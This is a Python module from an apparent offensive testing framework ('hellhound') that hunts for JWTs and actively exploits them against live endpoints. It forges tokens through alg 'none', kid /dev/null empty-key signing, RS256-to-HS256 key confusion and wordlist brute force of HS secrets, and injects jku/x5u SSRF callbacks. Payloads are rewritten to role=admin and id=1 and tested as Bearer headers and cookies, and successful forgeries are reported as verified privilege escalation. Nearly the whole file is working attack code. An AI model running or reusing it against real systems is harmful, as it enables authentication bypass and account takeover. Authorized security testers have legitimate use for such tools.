import json
import base64
import re
import hmac
import hashlib
import time
import asyncio
import aiohttp
from urllib.parse import urlparse
from hellhound.core import oob_utils, ai_utils

NAME = "jwtdetector"
CATEGORY = "vuln"
DESCRIPTION = "Active JWT Exploitation Suite: alg-none forgery, kid injection, alg-confusion & SSRF"

OPTIONS = [
    {"name": "token", "default": None, "required": True, "help": "Manual JWT token to analyze"},
    {"name": "cookie", "default": None, "required": False, "help": "Cookie string to extract JWT from"},
    {"name": "brute_force", "type": bool, "default": True, "help": "Enable HS256 secret brute-forcing"},
    {"name": "active_verify", "type": bool, "default": True, "help": "Attempt to verify forgeries against target"},
    {"name": "timeout", "type": int, "default": 10, "help": "Request timeout for active verification"},
]

COMMON_SECRETS = [
    "secret", "123456", "password", "key", "jwt", "admin", "12345678", 
    "qwerty", "supersecret", "changeit", "access", "root", "dev", "test",
    "private", "public", "master", "default", "guest", "webmaster",
    "0123456789", "111111", "abcdef", "identity", "auth", "security",
    "development", "production", "staging", "hellhound", "letmein",
    "welcome", "trustno1", "passw0rd", "monkey", "dragon", "iloveyou",
    "abc123", "football", "shadow", "master123", "1234567890",
    "qwerty123", "password1", "654321", "p@ssw0rd", "Pa$$w0rd",
]

# ── Helpers ──────────────────────────────────────────────────────────────────

def pad_base64(data):
    data = data.replace('-', '+').replace('_', '/')
    return data + '=' * (-len(data) % 4)

def encode_jwt_part(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':'))
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def jwk_to_pem(n_b64, e_b64):
    """Converts RSA n/e components from JWK to a standard PEM public key."""
    try:
        def int_to_bytes(n):
            return n.to_bytes((n.bit_length() + 7) // 8, 'big')

        def der_encode_length(l):
            if l < 0x80: return bytes([l])
            b = int_to_bytes(l)
            return bytes([0x80 | len(b)]) + b

        def der_encode_integer(n):
            b = int_to_bytes(n)
            if b[0] & 0x80: b = b'\x00' + b
            return b'\x02' + der_encode_length(len(b)) + b

        def der_encode_sequence(payload):
            return b'\x30' + der_encode_length(len(payload)) + payload

        n = int.from_bytes(base64.urlsafe_b64decode(pad_base64(n_b64)), 'big')
        e = int.from_bytes(base64.urlsafe_b64decode(pad_base64(e_b64)), 'big')
        
        # PKCS#1 RSAPublicKey: SEQUENCE { n, e }
        pkcs1 = der_encode_sequence(der_encode_integer(n) + der_encode_integer(e))
        # SubjectPublicKeyInfo: SEQUENCE { AlgorithmIdentifier, BIT STRING { pkcs1 } }
        alg_id = b'\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00'
        spki = der_encode_sequence(alg_id + b'\x03' + der_encode_length(len(pkcs1) + 1) + b'\x00' + pkcs1)
        
        b64 = base64.b64encode(spki).decode()
        pem = "-----BEGIN PUBLIC KEY-----\n"
        for i in range(0, len(b64), 64):
            pem += b64[i:i+64] + "\n"
        pem += "-----END PUBLIC KEY-----"
        return pem
    except Exception:
        return None

# ── Auditor Core ─────────────────────────────────────────────────────────────

class JWTAuditor:
    def __init__(self, emit, session, options, target_url=None):
        self.emit = emit
        self.session = session
        self.options = options
        self.target_url = target_url
        self.oob_url = oob_utils.resolve_oob_url(options)
        self.findings = []
        self.discovered_keys = []
        self.failure_keywords = ["unauthorized", "invalid", "expired", "forbidden", "access denied", "error", "fail"]

    async def audit_token(self, token, source):
        """Perform both passive and active audit for a JWT token."""
        parts = token.split('.')
        if len(parts) != 3: return
        
        try:
            header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])).decode())
            payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])).decode())
        except (json.JSONDecodeError, ValueError, base64.binascii.Error):
            return

        finding = {
            "token": token,
            "source": source,
            "original_header": header,
            "original_payload": payload,
            "vulnerabilities": [],
            "active_verifications": [],
            "sensitive_claims": []
        }

        # 1. Passive Analysis (Immediate)
        alg = header.get("alg", "").lower()
        if alg == "none":
            finding["vulnerabilities"].append("HIGH: Algorithm 'none' set in token header.")
        
        self._analyze_claims(finding)
        
        # 2. Active Analysis (Requires Target)
        if self.target_url:
            if alg == "none" or self.options.get("active_verify"):
                await self._test_none_alg(finding)
                await self._test_kid_injection(finding)
                await self._test_alg_confusion(finding)
                await self._test_ssrf_headers(finding)

            if alg.startswith("hs") and self.options.get("brute_force"):
                secret = self._brute_force_hs(parts[0], parts[1], parts[2], alg)
                if secret:
                    finding["vulnerabilities"].append(f"CRITICAL: Weak {alg.upper()} secret found: '{secret}'")
                    await self._verify_forgery(finding, "Secret Key Forgery", {"alg": alg.upper()}, {"admin": True}, secret)

            if alg.startswith("rs"):
                await self._test_alg_confusion(finding)

            if "kid" in header:
                await self._test_kid_injection(finding)

            if "jku" in header or "x5u" in header:
                await self._test_ssrf_headers(finding)

        if finding["vulnerabilities"] or finding["sensitive_claims"]:
            self.findings.append(finding)

    async def _test_none_alg(self, finding):
        """Active verification of alg: none vulnerability with recursive escalation."""
        header = finding["original_header"].copy()
        header["alg"] = "none"
        payload = finding["original_payload"].copy()
        
        self._escalate_payload(payload)
        forged = f"{encode_jwt_part(header)}.{encode_jwt_part(payload)}."
        
        if self.options.get("active_verify") and self.target_url:
            success = await self._check_token_acceptance(forged)
            if success:
                v_msg = "CRITICAL: Verified Algorithm 'none' acceptance with Privilege Escalation!"
                finding["vulnerabilities"].append(v_msg)
                
                # Strict single-exploit grouping
                exploit = next((e for e in finding["active_verifications"] if e["type"] == "alg:none (Admin Escalation)"), None)
                if not exploit:
                    exploit = {
                        "type": "alg:none (Admin Escalation)",
                        "status": "VERIFIED",
                        "forged_token": forged,
                        "forged_payload": payload,
                        "verified_urls": []
                    }
                    finding["active_verifications"].append(exploit)
                
                if self.target_url not in exploit["verified_urls"]:
                    exploit["verified_urls"].append(self.target_url)
        elif header.get("alg") == "none":
            finding["vulnerabilities"].append("HIGH: Algorithm 'none' set in token header.")

    def _brute_force_hs(self, header_b64, payload_b64, signature_b64, alg):
        """Brute-force HSxxx signature."""
        msg = f"{header_b64}.{payload_b64}".encode()
        try:
            sig = base64.urlsafe_b64decode(pad_base64(signature_b64))
        except (base64.binascii.Error, ValueError):
            return None
        
        hash_func = hashlib.sha256 if "256" in alg else hashlib.sha384 if "384" in alg else hashlib.sha512
        
        for secret in COMMON_SECRETS:
            h = hmac.new(secret.encode(), msg, hash_func).digest()
            if h == sig: return secret
        return None

    async def _test_alg_confusion(self, finding):
        """Test for Algorithm Confusion (RS256 -> HS256)."""
        await self._discover_keys()
        
        for key in self.discovered_keys:
            await self._verify_forgery(finding, "Algorithm Confusion", {"alg": "HS256"}, {"admin": True}, key)

    async def _test_kid_injection(self, finding):
        """Test kid parameter for injections and empty-key forgery."""
        kid = finding["original_header"].get("kid")
        await self._verify_forgery(finding, "kid Injection (Empty Key)", {"alg": "HS256", "kid": "/dev/null"}, {"admin": True}, "")

        injection_indicators = ["../", "/etc/", "UNION SELECT", "'", "\""]
        if any(i in str(kid) for i in injection_indicators):
            finding["vulnerabilities"].append(f"HIGH: Suspected Injection in 'kid': {kid}")

    async def _test_ssrf_headers(self, finding):
        """Test jku/x5u headers for SSRF via OOB."""
        for hname in ["jku", "x5u"]:
            val = finding["original_header"].get(hname)
            if not val: continue
            
            finding["vulnerabilities"].append(f"MEDIUM: JWT {hname} header present: {val}")
            
            if self.oob_url:
                token = f"jwt-ssrf-{hname}-{int(time.time())}"
                oob_target = f"{self.oob_url}/{token}"
                
                header = finding["original_header"].copy()
                header[hname] = oob_target
                forged = f"{encode_jwt_part(header)}.{encode_jwt_part(finding['original_payload'])}.SSBMT1ZFIFVSCg"
                
                await self._check_token_acceptance(forged)
                
                oob_server = self.options.get("oob_server")
                if oob_server:
                    hit, _ = oob_server.poll(token, timeout=5)
                    if hit:
                        finding["vulnerabilities"].append(f"CRITICAL: Confirmed SSRF via {hname} header!")

    async def _verify_forgery(self, finding, attack_name, header_mods, payload_mods, secret):
        """Utility to forge and verify a token with recursive escalation."""
        header = finding["original_header"].copy()
        header.update(header_mods)
        payload = finding["original_payload"].copy()
        payload.update(payload_mods)
        self._escalate_payload(payload) # Apply deep escalation
        
        msg = f"{encode_jwt_part(header)}.{encode_jwt_part(payload)}"
        alg = header.get("alg", "HS256").lower()
        hash_func = hashlib.sha256 if "256" in alg else hashlib.sha384 if "384" in alg else hashlib.sha512
        
        if isinstance(secret, str): secret = secret.encode()
        sig = hmac.new(secret, msg.encode(), hash_func).digest()
        forged = f"{msg}.{base64.urlsafe_b64encode(sig).decode().rstrip('=')}"
        
        if self.options.get("active_verify") and self.target_url:
            if await self._check_token_acceptance(forged):
                v_msg = f"CRITICAL: Verified {attack_name} with Privilege Escalation!"
                finding["vulnerabilities"].append(v_msg)
                
                # Strict single-exploit grouping
                exploit = next((e for e in finding["active_verifications"] if e["type"] == attack_name), None)
                if not exploit:
                    exploit = {
                        "type": attack_name,
                        "status": "VERIFIED",
                        "forged_token": forged,
                        "forged_payload": payload,
                        "verified_urls": []
                    }
                    finding["active_verifications"].append(exploit)
                
                if self.target_url not in exploit["verified_urls"]:
                    exploit["verified_urls"].append(self.target_url)

    def _escalate_payload(self, obj):
        """Recursively hunt and escalate sensitive claims."""
        if isinstance(obj, dict):
            for k, v in obj.items():
                kl = k.lower()
                if kl == "role": obj[k] = "admin"
                elif kl == "admin": obj[k] = True
                elif kl == "privilege": obj[k] = "superuser"
                elif kl == "id" and str(v).isdigit(): obj[k] = 1 # Often admin ID is 1
                self._escalate_payload(v)
        elif isinstance(obj, list):
            for item in obj:
                self._escalate_payload(item)

    async def _check_token_acceptance(self, forged_token):
        """Check if the server accepts the forged token with intelligent differential analysis."""
        if not self.target_url: return False
        
        # Test strategies: Auth header, then common cookies
        test_vectors = [
            {"headers": {"Authorization": f"Bearer {forged_token}"}},
            {"cookies": {"session": forged_token}},
            {"cookies": {"jwt": forged_token}},
            {"cookies": {"token": forged_token}}
        ]
        
        try:
            # 1. Baseline Request (with original token if possible, or none)
            async with self.session.get(self.target_url, timeout=self.options.get("timeout")) as r:
                baseline_status = r.status
                baseline_body = (await r.text()).lower()
                baseline_len = len(baseline_body)

            for vector in test_vectors:
                async with self.session.get(self.target_url, timeout=self.options.get("timeout"), **vector) as r:
                    new_status = r.status
                    new_body = (await r.text()).lower()
                    new_len = len(new_body)
                    
                    # Logic: 
                    # - Status change from 401/403 -> 200 is a clear win
                    # - If 200, check if failure keywords disappeared compared to baseline
                    # - Or if the length changed significantly (indicating different content)
                    if new_status == 200:
                        if baseline_status in [401, 403]: return True
                        
                        # Check if failure keywords in baseline are NOT in new response
                        baseline_has_fail = any(k in baseline_body for k in self.failure_keywords)
                        new_has_fail = any(k in new_body for k in self.failure_keywords)
                        
                        if baseline_has_fail and not new_has_fail: return True
                        
                        # If length is significantly different but still 200
                        if abs(new_len - baseline_len) > 100: return True
                        
            return False
        except (aiohttp.ClientError, asyncio.TimeoutError):
            return False

    async def _discover_keys(self):
        """Hunt for public keys/JWKS and convert them to PEM for confusion attacks."""
        if not self.target_url or self.discovered_keys: return
        
        parsed = urlparse(self.target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        paths = [
            "/.well-known/jwks.json", "/jwks.json", "/api/jwks.json",
            "/.well-known/openid-configuration"
        ]
        
        for p in paths:
            try:
                async with self.session.get(base + p, timeout=5) as r:
                    if r.status == 200:
                        data = await r.json()
                        if "keys" in data:
                            for k in data["keys"]:
                                if k.get("kty") == "RSA" and "n" in k and "e" in k:
                                    pem = jwk_to_pem(k["n"], k["e"])
                                    if pem:
                                        self.discovered_keys.append(pem)
                                        self.emit.success(f"    [+] Discovered & Converted JWK to PEM from {p}")
            except (aiohttp.ClientError, json.JSONDecodeError, KeyError):
                pass

    def _analyze_claims(self, finding):
        """Analyze claims recursively for sensitive info."""
        sens = ["email", "role", "admin", "password", "secret", "id", "user", "privilege", "internal", "group", "scope", "permissions"]
        finding["sensitive_claims"] = []
        
        def _scan(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if any(s in str(k).lower() for s in sens):
                        finding["sensitive_claims"].append(f"{k}: {v}")
                    _scan(v)
            elif isinstance(obj, list):
                for item in obj:
                    _scan(item)
        
        _scan(finding["original_payload"])

    def get_summary(self):
        risk = 0
        vulns_count = 0
        for f in self.findings:
            vulns_count += len(f["vulnerabilities"])
            for v in f["vulnerabilities"]:
                if "CRITICAL" in v: risk += 10
                elif "HIGH" in v: risk += 5
                else: risk += 2
        return risk, vulns_count

async def run(target, emit, options=None):
    emit.info(f"[*] JWT_DETECTOR: Active auditing for {target}")
    
    spider_intel = options.get("spider_intel", {}) if options else {}
    endpoints = spider_intel.get("endpoints", [])
    secrets = spider_intel.get("secrets", [])
    
    # 1. Collect Tokens
    tokens = set()
    for s in secrets:
        content = s.get("content", "")
        matches = re.findall(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+", content)
        for m in matches: tokens.add((m, s.get("source", "spider")))
    
    # 1. Collect Tokens (Manual + Cookies + Spider)
    def is_jwt(t):
        if not t or not isinstance(t, str): return False
        parts = t.split(".")
        return len(parts) == 3 and all(len(p) > 0 for p in parts)
    
    if token_opt := options.get("token") if options else None:
        if is_jwt(token_opt):
            tokens.add((token_opt, "manual"))
        else:
            emit.warn(f"    [!] Invalid manual token provided. Skipping manual audit.")
            
    if cookie_opt := options.get("cookie") if options else None:
        matches = re.findall(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+", str(cookie_opt))
        for m in matches: tokens.add((m, "manual_cookie"))

    # 1. Passive Audit First (Independent of Targets)
    all_findings = []
    auditor_passive = JWTAuditor(emit, None, options or {})
    for t, src in tokens:
        await auditor_passive.audit_token(t, src)
    all_findings.extend(auditor_passive.findings)

    # 2. Identify Audit Targets (Spider Endpoints + Main Target)
    audit_targets = {target}
    for ep in endpoints:
        url = ep.get("url")
        if not url: continue
        # Prioritize interesting routes
        if ep.get("auth_required") or any(x in url.lower() for x in ["/api/", "/user", "/admin", "/settings", "/profile", "/v1/", "/v2/"]):
            audit_targets.add(url)
    
    # Limit to top 10 targets to prevent DOS and keep it fast
    targets_to_audit = list(audit_targets)[:10]
    emit.info(f"    [i] Auditing {len(tokens)} token(s) against {len(targets_to_audit)} high-value endpoint(s)...")

    # 3. Active Audit (Against Targets)
    async with aiohttp.ClientSession() as session:
        # Apply global config (Proxy, WAF bypass, etc.)
        from hellhound.core import http_utils
        http_utils.apply_session_config(session, options or {})
        
        for audit_url in targets_to_audit:
            auditor_active = JWTAuditor(emit, session, options or {}, target_url=audit_url)
            for t, src in tokens:
                await auditor_active.audit_token(t, src)
            all_findings.extend(auditor_active.findings)

    # 4. Deduplicate findings by token + unique vulnerabilities
    unique_findings = []
    seen_tokens = {} # token -> finding_obj
    
    for f in all_findings:
        t = f["token"]
        if t not in seen_tokens:
            seen_tokens[t] = f
            unique_findings.append(f)
        else:
            # Merge vulnerabilities, verifications, and claims
            for v in f["vulnerabilities"]:
                if v not in seen_tokens[t]["vulnerabilities"]:
                    seen_tokens[t]["vulnerabilities"].append(v)
            for av in f["active_verifications"]:
                # Find if we already have this exploit type for this token
                existing_av = next((e for e in seen_tokens[t]["active_verifications"] if e["type"] == av["type"]), None)
                if not existing_av:
                    seen_tokens[t]["active_verifications"].append(av)
                else:
                    # Merge verified URLs into the existing record
                    for url in av.get("verified_urls", []):
                        if url not in existing_av["verified_urls"]:
                            existing_av["verified_urls"].append(url)
            for sc in f.get("sensitive_claims", []):
                if sc not in seen_tokens[t]["sensitive_claims"]:
                    seen_tokens[t]["sensitive_claims"].append(sc)

    risk = 0
    vcount = 0
    for f in unique_findings:
        vcount += len(f["vulnerabilities"])
        for v in f["vulnerabilities"]:
            if "CRITICAL" in v: risk += 10
            elif "HIGH" in v: risk += 5
            else: risk += 2

    if unique_findings:
        rst, b_red, b_grn, b_yel, b_cyn = "\033[0m", "\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;96m"
        emit.success(f"JWT_DETECTOR COMPLETE: Found {vcount} Vulnerabilities")
        
        for f in unique_findings:
            emit.info(f"SOURCE: {f['source'].upper()}")
            
            for v in f["vulnerabilities"]:
                v_color = b_red if "CRITICAL" in v else b_yel if "HIGH" in v else "\033[1;34m"
                emit.warn(f"{v_color}{v}{rst}")
            
            for av in f["active_verifications"]:
                url_msg = f"Verified on {len(av['verified_urls'])} targets" if len(av['verified_urls']) > 1 else f"Verified on {av['verified_urls'][0]}"
                emit.success(f"{b_grn}{av['type']}: {url_msg}{rst}")
                emit.info(f"{b_cyn}Proof: role=admin, id=1 (Check Loot for Forged JSON){rst}")
            
            if f.get("sensitive_claims"):
                emit.info(f"Rule-Based Audit: Found {len(f['sensitive_claims'])} sensitive fields")
                for sc in f["sensitive_claims"]: 
                    emit.info(f" - {sc}")

    return {
        "raw": f"Analyzed {len(tokens)} tokens across {len(targets_to_audit)} targets.",
        "intel": {"jwts": unique_findings, "risk_score": risk},
        "signals": ["JWT_VULN_FOUND"] if unique_findings else ["JWT_SECURE"]
    }
